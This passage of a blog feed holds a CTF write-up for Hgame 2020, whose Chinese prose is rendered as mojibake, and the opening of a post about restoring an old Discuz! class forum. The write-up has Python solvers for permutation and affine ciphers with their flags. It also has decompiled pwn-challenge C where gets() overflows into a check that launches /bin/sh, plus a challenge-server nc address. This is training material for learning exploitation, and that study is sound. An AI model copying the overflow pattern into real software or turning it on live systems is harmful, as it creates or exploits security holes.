operator">=</span><span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>str1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>str2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    ilocation<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>str2<span class="token punctuation">.</span>index<span class="token punctuation">(</span>str1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>ilocation<span class="token punctuation">)</span><span class="token comment"># [4, 14, 5, 6, 15, 7, 3, 9, 2, 10, 11, 12, 13, 1, 8, 0, 20, 30, 21, 22, 31, 23, 19, 25, 18, 26, 27, 28, 29, 17, 24, 16]</span><span class="token comment"># éªŒè¯ç»“æœ</span>str3<span class="token operator">=</span><span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> location<span class="token punctuation">:</span>    str3<span class="token operator">+=</span>str1<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>str3<span class="token punctuation">)</span>    <span class="token comment">#  jhca1346ibdefg25zxsqkmnpyrtuvwlo</span></code></pre><p>è¿™é‡Œç”¨åˆ°çš„æ˜¯æ­£å˜æ¢ï¼Œ<strong>æš´åŠ›ç ´è§£</strong>ä¸€æ³¢å§ï¼</p><pre class="language-python" data-language="python"><code class="language-python">str_encrypted <span class="token operator">=</span> <span class="token string">r'Lm$jham{pUt+5Ige}!Au3Pem!TTi0n_R'</span>str_decrypted <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> location<span class="token punctuation">:</span>        str_decrypted <span class="token operator">+=</span> str_encrypted<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>str_decrypted<span class="token punctuation">)</span>    str_encrypted <span class="token operator">=</span> str_decrypted    str_decrypted <span class="token operator">=</span> <span class="token string">''</span></code></pre><p>æœ€å¼€å§‹è¯•äº†50æ¬¡æ²¡å‡ºæ¥233ï¼Œåæ¥æŠŠæ•°å­—æ”¹å¤§äº†ä¸€ç‚¹233.</p><p>ç»ˆäºè·‘å‡ºæ¥äº†ï¼</p><p><img src="/2020/01/23/CTF_Hgame2020/crypto_Reorder.png" alt="crypto_Reorder"></p><p><strong>å¾—åˆ°flagï¼š</strong></p><p><code>hgame{jU$t+5ImpL3_PeRmuTATi0n!!}</code></p><blockquote><p><strong>æœç„¶å°±æ’åˆ—å‘—23333</strong></p></blockquote><p>è¿˜è¯•äº†ä¸€ä¸‹ï¼Œè¿™ä¸ª130æ¬¡ä¸€å¾ªç¯æ¥ç€emmmã€‚å°±è¿™æ ·ï¼Œå‘ç°rangeæ”¹åˆ°131å°±å‡ºç°ä¸¤ä¸ªäº†ã€‚</p><pre class="language-python" data-language="python"><code class="language-python">str_encrypted <span class="token operator">=</span> <span class="token string">r'Lm$jham{pUt+5Ige}!Au3Pem!TTi0n_R'</span>str_decrypted <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">130</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> location<span class="token punctuation">:</span>        str_decrypted <span class="token operator">+=</span> str_encrypted<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    <span class="token keyword">if</span> str_decrypted<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">'hgame'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>str_decrypted<span class="token punctuation">)</span>    str_encrypted <span class="token operator">=</span> str_decrypted    str_decrypted <span class="token operator">=</span> <span class="token string">''</span></code></pre><p><strong>ä¸å¯¹å”‰ï¼</strong>å¥½åƒæ²¡è¿™ä¹ˆç®€å•ã€‚é‡æ–°è¯•äº†ä¸€ä¸‹ä¹‹å‰çš„å‡ ä¸ª<code>Rua!!!</code>ä¹‹åçš„ç»“æœï¼Œå‘ç°è¿™ä¸ªå˜æ¢ä¸å¯è¡Œemmmã€‚</p><p><strong>å¿…é¡»æ˜¯è¿ç»­è¾“å…¥ä¸Šä¸€æ¬¡å‡ºæ¥çš„ç»“æœæ‰è¡Œã€‚<em>ï¼ˆå¯èƒ½ç†è§£æœ‰è¯¯</em></strong></p><p><img src="/2020/01/23/CTF_Hgame2020/crypto_Reorder2.png" alt="crypto_Reorder2"></p><hr><h3 id="Affine"><a href="#Affine" class="headerlink" title="Affine"></a>Affine</h3><p>é¢˜ç›®ç»™äº†è¿™æ®µç”¨æ¥åŠ å¯†çš„ä»£ç ï¼Œç°åœ¨å°±æƒ³åŠæ³•è¿˜åŸå›å»æ‰¾flagå§ã€‚</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token keyword">import</span> gmpy2<span class="token keyword">from</span> secret <span class="token keyword">import</span> A<span class="token punctuation">,</span> B<span class="token punctuation">,</span> flag<span class="token keyword">assert</span> flag<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">'hgame{'</span><span class="token punctuation">)</span> <span class="token keyword">and</span> flag<span class="token punctuation">.</span>endswith<span class="token punctuation">(</span><span class="token string">'}'</span><span class="token punctuation">)</span>TABLE <span class="token operator">=</span> <span class="token string">'zxcvbnmasdfghjklqwertyuiop1234567890QWERTYUIOPASDFGHJKLZXCVBNM'</span>MOD <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>TABLE<span class="token punctuation">)</span>cipher <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> b <span class="token keyword">in</span> flag<span class="token punctuation">:</span>    i <span class="token operator">=</span> TABLE<span class="token punctuation">.</span>find<span class="token punctuation">(</span>b<span class="token punctuation">)</span>    <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>        cipher <span class="token operator">+=</span> b    <span class="token keyword">else</span><span class="token punctuation">:</span>        ii <span class="token operator">=</span> <span class="token punctuation">(</span>A<span class="token operator">*</span>i <span class="token operator">+</span> B<span class="token punctuation">)</span> <span class="token operator">%</span> MOD        cipher <span class="token operator">+=</span> TABLE<span class="token punctuation">[</span>ii<span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>cipher<span class="token punctuation">)</span><span class="token comment"># A8I5z{xr1A_J7ha_vG_TpH410}</span></code></pre><p>æç¤ºäº†flagä»¥ <code>hgame{</code> å¼€å¤´ï¼Œä»¥ <code>}</code> ç»“å°¾ï¼Œå¾ˆæ˜æ˜¾èƒ½çœ‹å‡ºæ¥<code>{ } _</code>è¿™ä¸‰ä¸ªå­—ç¬¦æ˜¯æ‰¾ä¸åˆ°è€Œç›´æ¥åŠ åˆ°cipheré‡Œçš„ã€‚</p><p>å®¹æ˜“å¾—åˆ° MOD=62ï¼Œäºæ˜¯ä¹æ€è·¯å°±æ˜¯ï¼Œ<strong>åˆ©ç”¨  <code>hgame</code> ä¸ <code>A8I5z</code> çš„æ˜ å°„å…³ç³»ï¼ŒæŠŠAå’ŒBä¸¤ä¸ªå‚æ•°ç»™æ±‚è§£å‡ºæ¥ï¼Œå†æŠŠå‚æ•°iåè§£å‡ºæ¥ï¼Œæœ€åæŠŠflagè¿˜åŸ</strong>ã€‚</p><p>ç ä»£ç å§ã€‚</p><pre class="language-python" data-language="python"><code class="language-python">TABLE <span class="token operator">=</span> <span class="token string">'zxcvbnmasdfghjklqwertyuiop1234567890QWERTYUIOPASDFGHJKLZXCVBNM'</span>MOD <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>TABLE<span class="token punctuation">)</span>  <span class="token comment"># 62</span>flag <span class="token operator">=</span> <span class="token string">'hgame'</span>cipher <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> b <span class="token keyword">in</span> flag<span class="token punctuation">:</span>    i <span class="token operator">=</span> TABLE<span class="token punctuation">.</span>find<span class="token punctuation">(</span>b<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token comment"># æ±‚è§£å¾—åˆ°å¯¹åº”çš„i</span><span class="token comment"># h 12</span><span class="token comment"># g 11</span><span class="token comment"># a 7</span><span class="token comment"># m 6</span><span class="token comment"># e 18</span>str_encrypt <span class="token operator">=</span> <span class="token string">r'A8I5z{xr1A_J7ha_vG_TpH410}'</span>iis <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> letter <span class="token keyword">in</span> str_encrypt<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">:</span>    iis<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> TABLE<span class="token punctuation">.</span>index<span class="token punctuation">(</span>letter<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>letter<span class="token punctuation">,</span> iis<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>    i <span class="token operator">+=</span> <span class="token number">1</span><span class="token comment"># æ±‚è§£å¾—åˆ°å¯¹åº”çš„ii</span><span class="token comment"># A 46</span><span class="token comment"># 8 33</span><span class="token comment"># I 43</span><span class="token comment"># 5 30</span><span class="token comment"># z 0</span></code></pre><p>å¾—åˆ°äº†å­—æ¯å¯¹åº”çš„iå’Œiiï¼Œè€Œ**iä¸iiæ»¡è¶³å…³ç³» <code>(A*i+B) % 62 = ii</code>**ï¼Œä»è€Œå¯ä»¥æŠŠAã€Bè§£å‡ºæ¥ã€‚</p><p>æŸ¥äº†æŸ¥<strong>æ¨¡é€†è¿ç®—</strong>ï¼Œçœ‹äº†çœ‹è§‰å¾—æœ‰ç‚¹éº»çƒ¦emmm</p><p>çŒœæƒ³Aã€Bä¸ä¼šå¤ªå¤§ï¼Œå¹²è„†ç›´æ¥éå†å¥½äº†ã€‚ã€‚</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">for</span> A <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">62</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> B <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">62</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token number">12</span><span class="token operator">*</span>A<span class="token operator">+</span>B<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">62</span> <span class="token operator">==</span> <span class="token number">46</span> <span class="token keyword">and</span> <span class="token punctuation">(</span><span class="token number">11</span><span class="token operator">*</span>A<span class="token operator">+</span>B<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">62</span> <span class="token operator">==</span> <span class="token number">33</span> <span class="token keyword">and</span> <span class="token punctuation">(</span><span class="token number">7</span><span class="token operator">*</span>A<span class="token operator">+</span>B<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">62</span> <span class="token operator">==</span> <span class="token number">43</span> <span class="token keyword">and</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token operator">*</span>A<span class="token operator">+</span>B<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">62</span> <span class="token operator">==</span> <span class="token number">30</span> <span class="token keyword">and</span><span class="token punctuation">(</span><span class="token number">18</span><span class="token operator">*</span>A<span class="token operator">+</span>B<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">62</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Yes: "</span><span class="token punctuation">,</span> A<span class="token punctuation">,</span> B<span class="token punctuation">)</span><span class="token comment"># Yes:  13 14</span></code></pre><p>å¾—åˆ°A=13ï¼ŒB=14.</p><p>æ¥ä¸‹æ¥è¿˜åŸflagã€‚</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># Begin to decrypt...</span>A <span class="token operator">=</span> <span class="token number">13</span>B <span class="token operator">=</span> <span class="token number">14</span>str_encrypt <span class="token operator">=</span> <span class="token string">'xr1AJ7havGTpH410'</span>str_decrypt <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> letter <span class="token keyword">in</span> str_encrypt<span class="token punctuation">:</span>    ii <span class="token operator">=</span> TABLE<span class="token punctuation">.</span>index<span class="token punctuation">(</span>letter<span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">62</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        temp <span class="token operator">=</span> <span class="token punctuation">(</span>A<span class="token operator">*</span>i <span class="token operator">+</span> B<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">62</span>        <span class="token keyword">if</span> temp <span class="token operator">==</span> ii<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> TABLE<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>            str_decrypt <span class="token operator">+=</span> TABLE<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>str_decrypt<span class="token punctuation">)</span><span class="token comment"># M4thu5EdiNcRYpt0</span><span class="token comment"># So the flag is `hgame{M4th_u5Ed_iN_cRYpt0}`.</span></code></pre><p>è¿™é‡Œå…ˆæŠŠ<code>_</code>ç»™å»æ‰äº†ï¼Œæœ€åå†åŠ ä¸Šã€‚</p><p>äºæ˜¯ä¹flagå°±æ˜¯ï¼š</p><p><code>hgame{M4th_u5Ed_iN_cRYpt0}</code></p><blockquote><p>çœ‹æ¥æœç„¶æ˜¯æ•°å­¦å•Š2333ï¼Œè¿˜æƒ³çœ‹çœ‹å¤§ä½¬ä»¬æ€ä¹ˆç”¨æ•°å­¦æ–¹æ³•è§£å‡ºæ¥çš„ã€‚ï¼ˆï¼ˆ</p><p>å¦‚é¢˜ç›®æ‰€è¨€â€”â€”  </p><blockquote><p>Some basic modular arithmeticâ€¦</p></blockquote></blockquote><blockquote><p><em>Reference:</em> ä¸€ç‚¹å…³äºæ¨¡é€†è¿ç®—çš„ä»‹ç»ï¼Œåé¢æœ‰ç©ºå†çœ‹çœ‹å§ï¼ˆx</p><p><a href="https://blog.csdn.net/lion19930924/article/details/61926019">https://blog.csdn.net/lion19930924/article/details/61926019</a></p></blockquote><hr><hr><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="Hard-AAAAA"><a href="#Hard-AAAAA" class="headerlink" title="Hard_AAAAA"></a>Hard_AAAAA</h3><p>nc 47.103.214.163 20000</p><p>IDAåˆ†æä¸€æ³¢ï¼Œå‘ç°æ˜¯memcmpæ¯”è¾ƒï¼Œ<code>backdoor</code>å‡½æ•°é‡Œæ˜¯æ‰§è¡Œ<code>/bin/sh</code>çš„ã€‚</p><p>å…¶ä¸­sä¸v5è·ç¦»ä¸º -31h-(-ACh)=123ï¼Œæ„é€ payloadå‘äº†ä¸ª<code>"0O0o"</code>è¿‡å»ï¼Œå‘ç°ä¹ˆå¾—ã€‚</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">char</span> s<span class="token punctuation">;</span> <span class="token comment">// [esp+0h] [ebp-ACh]</span>  <span class="token keyword">char</span> v5<span class="token punctuation">;</span> <span class="token comment">// [esp+7Bh] [ebp-31h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v6<span class="token punctuation">;</span> <span class="token comment">// [esp+A0h] [ebp-Ch]</span>  <span class="token keyword">int</span> <span class="token operator">*</span>v7<span class="token punctuation">;</span> <span class="token comment">// [esp+A4h] [ebp-8h]</span>  v7 <span class="token operator">=</span> <span class="token operator">&amp;</span>argc<span class="token punctuation">;</span>  v6 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">alarm</span><span class="token punctuation">(</span><span class="token number">8u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setbuf</span><span class="token punctuation">(</span>_bss_start<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0xA0u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Let's 0O0o\\0O0!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">gets</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">memcmp</span><span class="token punctuation">(</span><span class="token string">"0O0o"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v5<span class="token punctuation">,</span> <span class="token number">7u</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token function">backdoor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p><strong>20200125æ›´æ–°ï¼š</strong></p><p>çœ‹äº†å®˜æ–¹WPï¼Œè‰ï¼ˆä¸€ç§æ¤ç‰©ï¼‰ï¼Œå¥½æ°”å•Šï¼Œ<code>\x00</code>æŠŠå­—ç¬¦ä¸²è¯†åˆ«éš”æ–­äº†ã€‚</p><p><img src="/2020/01/23/CTF_Hgame2020/pwn_Hard_AAAAA.png" alt="image-20200125172242766"></p><hr><hr><h2 id="æœªå®Œå¾…ç»­"><a href="#æœªå®Œå¾…ç»­" class="headerlink" title="æœªå®Œå¾…ç»­"></a><strong>æœªå®Œå¾…ç»­</strong></h2><p><em>ï¼ˆå¯èƒ½ä¼šå’•å’•å’•</em></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å°æƒ³æ³• | é‡å»ºé‚£äº›å¹´åŸºäºDiscuz!ç³»ç»Ÿæ­å»ºçš„æ»¡æ˜¯å›å¿†çš„ç­çº§ç½‘ç«™</title>
      <link href="2020/01/09/Idea_RebuildClassWebsite/"/>
      <url>2020/01/09/Idea_RebuildClassWebsite/</url>
      
        <content type="html"><![CDATA[<p><strong>2020å¹´ç¬¬ä¸€ç¯‡å“ˆï¼Œå…ˆç¥å¤§å®¶æ–°å¹´å¿«ä¹ï¼Œæ¯å¤©éƒ½æœ‰æ–°æ”¶è·å–µï¼</strong>  </p><p>å“‡å‘œï¼ä»Šå¤©ç»ˆäºä¸‹äº†ä»Šå¹´çš„ç¬¬ä¸€åœºé›ªï¼Œè´¼æƒŠå–œ~ï¼ˆç„¶è€Œç§¯ä¸èµ·æ¥å•Šå˜¤å˜¤å˜¤</p><p><br><br></p><hr><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><blockquote><p>æœ€è¿‘æœŸæœ«è€ƒè¯•æœˆå¿™æ­»äº†ï¼Œåˆšè€ƒå®Œä¸€ç§‘ï¼Œéš¾å¾—æœ‰ç©ºæ¥æµªä¸€ä¸‹ã€‚è€ƒå®Œä¸€ç§‘æµªä¸¤å¤©ç„¶åä½œæ­»å¤ä¹ çš„æ˜¯æˆ‘äº†emmmå˜¤å˜¤å˜¤ã€‚</p></blockquote><p>æœ‰ä¸€æ¬¡å’Œå¥¶å†°å†°èŠå¤©ï¼Œå›å¿†èµ·ä¹‹å‰æŠ˜è…¾è¿‡çš„ã€æ­å»ºè¿‡çš„å„ç§ç½‘ç«™ï¼Œè€Œåå°±æƒ³åˆ°äº†Nå¹´ä»¥å‰æ­å»ºçš„ç­çº§ç½‘ç«™ã€‚</p><p>ï¼ˆå¾ˆæ˜æ˜¾ï¼Œé‚£æ—¶å€™æä¾›ç½‘ç»œæœåŠ¡çš„å„ç§ç©ºé—´ã€åŸŸåä»€ä¹ˆçš„åˆ°ç°åœ¨æ²¡å‡ ä¸ªè¿˜èƒ½ç”¨çš„äº†ã€‚</p><p>2017å¹´10æœˆçš„æ—¶å€™ï¼Œæˆ‘çš„é‚®ç®±çªç„¶æ”¶åˆ°äº†ä¸€å°æ¥è‡ªRed Hatçš„é‚®ä»¶ï¼Œæé†’æˆ‘OpenShift Online v2 <strong>End of Life</strong>äº†ã€‚â†“</p><img src="/2020/01/09/Idea_RebuildClassWebsite/end_of_life.jpg" alt="End_of_Life" style="max-width:40%;"><p>é‚£æ—¶å€™æ„Ÿè§‰ç‰¹åˆ«æƒŠå–œï¼Œæ¯•ç«Ÿåˆ°é‚£æ—¶å·²ç»æ”¾åœ¨é‚£ä¸Šé¢å››äº”å¹´äº†ï¼Œæˆ‘éƒ½å·®ç‚¹å¿˜è®°å®ƒçš„å­˜åœ¨äº†ã€‚è™½ç„¶åŸŸåæ—©å°±ç‚¸äº†ï¼Œä½†æ˜¯è¿™ä¸ª<em>å…è´¹çš„</em>äº‘å¹³å°å±…ç„¶è¿˜åœ¨ï¼ˆè¿™ä¸ªè§’åº¦çœ‹æ¥ Red Hat è¿˜æ˜¯æŒºå¯é çš„233ï¼‰ã€‚</p><p>é‚£æ—¶å°±ç™»ä¸Šå»çœ‹äº†ä¸€ä¸‹ï¼Œå“‡å‘œæ•°æ®å±…ç„¶éƒ½è¿˜åœ¨ï¼Œé€šè¿‡é»˜è®¤çš„åŸŸåè¿˜è®¿é—®åˆ°äº†ç½‘ç«™ï¼Œäºæ˜¯å¥½æ€€å¿µå•Šï¼Œä¸ºäº†ç•™ä¸ªçºªå¿µå°±æˆªäº†ä¸ªå›¾ã€‚</p><blockquote><p>Nå¹´å‰å…ˆå»ºäº†10ç­çš„ç­ç½‘è®ºå›ï¼Œ<em>ï¼ˆåˆ†ç­åï¼‰</em>åˆå»ºäº†ä¸ª8ç­çš„ç­ç½‘ã€‚    </p></blockquote><img src="/2020/01/09/Idea_RebuildClassWebsite/backup_screenshot2.jpg" alt="img" style="max-width:50%;"><img src="/2020/01/09/Idea_RebuildClassWebsite/backup_screenshot1.jpg" alt="img" style="max-width:50%;"><p>â€‹    å‡ å¤©ä¹‹åï¼Œæœä¸å…¶ç„¶ï¼Œ<strong>Unavailableäº†</strong>ã€‚</p><img src="/2020/01/09/Idea_RebuildClassWebsite/end_of_life2.jpg" alt="End_of_Life2" style="max-width:43%;"><p>ä¸è¿‡è¿˜å¥½é‚£æ—¶å€™å°±æœ‰å¤‡ä»½çš„å¥½ä¹ æƒ¯ï¼ˆä¸æ˜¯ï¼‰ï¼Œè¯•äº†å‡ ä¸ªå¯†ç ç™»å½•è¿›äº†8ç­çš„ç­ç½‘ï¼Œç„¶åæŠŠæ•°æ®åº“ç»™å¤‡ä»½ä¸‹æ¥äº†ï¼Œä¸è¿‡ä¹Ÿåªå¤‡ä»½äº†æ•°æ®åº“ï¼Œé™„ä»¶å•Šå¤´åƒå•Šè¿™äº›å°±æ²¡å¤‡ä»½ä¸‹æ¥ã€‚10ç­çš„ç­ç½‘ï¼ˆæ›´æ˜¯ç”±äºè®°ä¸å¾—å¯†ç äº†ï¼‰å°±æ²¡æˆåŠŸå¤‡ä»½emmmã€‚</p><blockquote><p>äºæ˜¯ç°åœ¨å°±è§‰å¾—æœ‰ç‚¹é—æ†¾ï¼Œé€šè¿‡<em>phpMyAdmin</em>å…¶å®å¯ä»¥ç›´æ¥å¯¼å‡ºæ•°æ®åº“çš„ï¼›åœ¨é‡å»ºçš„æ—¶å€™çŸ¥é“é€šè¿‡ä¿®æ”¹æ•°æ®åº“å¯ä»¥æŠŠåˆ›å§‹äººå¯†ç ä¿®æ”¹çš„ã€‚</p><p>ä½†é‚£æ—¶å€™ä¸å¤§æ¸…æ¥šè¿™äº›ï¼Œä¹Ÿæœ‰å¯èƒ½æ˜¯é‚£æ—¶è¿æœåŠ¡å™¨å¯†ç éƒ½ä¸è®°å¾—äº†ï¼ˆï¼ˆï¼ˆ</p></blockquote><hr><p>æœ€è¿‘è¿™å‡ å¤©å°±æƒ³ï¼Œå¹²è„†è¯•ä¸€ä¸‹ï¼Œçœ‹çœ‹èƒ½ä¸èƒ½é‡å»ºé‚£æ—¶å€™çš„ç­ç½‘å§ã€‚</p><h2 id="é‡å»ºæŠ˜è…¾è®°"><a href="#é‡å»ºæŠ˜è…¾è®°" class="headerlink" title="é‡å»ºæŠ˜è…¾è®°"></a>é‡å»ºæŠ˜è…¾è®°</h2><h3 id="è¾£é¸¡æœåŠ¡å™¨é…ç½®å‡ºäº†ä¸€å †é—®é¢˜"><a href="#è¾£é¸¡æœåŠ¡å™¨é…ç½®å‡ºäº†ä¸€å †é—®é¢˜" class="headerlink" title="è¾£é¸¡æœåŠ¡å™¨é…ç½®å‡ºäº†ä¸€å †é—®é¢˜"></a>è¾£é¸¡æœåŠ¡å™¨é…ç½®å‡ºäº†ä¸€å †é—®é¢˜</h3><p>ä¹‹å‰éƒ½æ²¡æœ‰è‡ªå·±åŠ¨æ‰‹åœ¨è£¸æœºä¸Šé…ç½®WEBç¯å¢ƒæ¥ç€ï¼ŒLinuxä¹Ÿæ²¡æœ‰å¤šå°‘ç»éªŒï¼Œäºæ˜¯ä¹ä¸Šæ‰‹å°±æ¯”è¾ƒç—›è‹¦ã€‚</p><blockquote><p>ä¸‹é¢æ˜¯ä¸€å †åºŸè¯emmm</p><p><strong>ä¸æƒ³çœ‹å°±ç›´æ¥è·³è¿‡è¿™èŠ‚å§ã€‚</strong></p></blockquote><p>ç§ŸæœåŠ¡å™¨çš„æ—¶å€™<em>å›¾çœäº‹</em>ç›´æ¥è£…äº†<code>PHPStudy</code>ï¼Œé‡Œé¢é›†æˆäº†<code>LNMP</code>ç¯å¢ƒï¼Œç„¶åç½‘ç«™ä»€ä¹ˆçš„ç›´æ¥å¯ä»¥åœ¨ä¸Šé¢é…ç½®ã€‚</p><p>ä¹‹å‰æ­äº†å‡ ä¸ªæµ‹è¯•ç”¨çš„ç½‘ç«™ï¼Œè¿è¡Œéƒ½æ²¡ä»€ä¹ˆé—®é¢˜ï¼Œèƒ½æ­£å¸¸è®¿é—®ã€‚</p><p>ç„¶è€Œè¿™æ¬¡æˆ‘å»ºäº†ä¸€ä¸ªæ–°çš„<code>PHP</code>ç¯å¢ƒï¼Œæ‰“å¼€ç«¯å£ï¼Œè®¿é—®çš„æ—¶å€™å±…ç„¶æŠ¥<strong>403æ— æƒé™</strong>ï¼Œä½†æ˜¯å…¶ä»–çš„ç½‘ç«™éƒ½æ²¡è¿™ä¸ªé—®é¢˜ã€‚</p><p>çœ‹åˆ°ç½‘é¡µä¸Šæ˜¯<code>nginx</code>æŠ¥çš„é”™ï¼Œå¾ˆè‡ªç„¶æ€€ç–‘å°±æ˜¯å®ƒçš„é—®é¢˜ã€‚æ£€æŸ¥äº†ä¸€ä¸‹é…ç½®æ²¡å‘ç°é—®é¢˜ï¼Œäºæ˜¯é‡è£…äº†ä¸€ä¸‹ã€‚è¿™å›ç›´æ¥æŠ¥<strong>500å†…éƒ¨æœåŠ¡å™¨é”™è¯¯</strong>äº†ã€‚ï¼ˆæˆ‘æ„£ä½äº†</p><p>çœ‹äº†ä¸€ä¸‹é”™è¯¯logï¼Œå‘ç°å¾ˆå¤šæ˜¯æ— æƒé™ï¼Œè¿˜æœ‰çš„æ‰¾ä¸åˆ°æ–‡ä»¶ï¼Ÿï¼Ÿï¼Ÿ</p><p><img 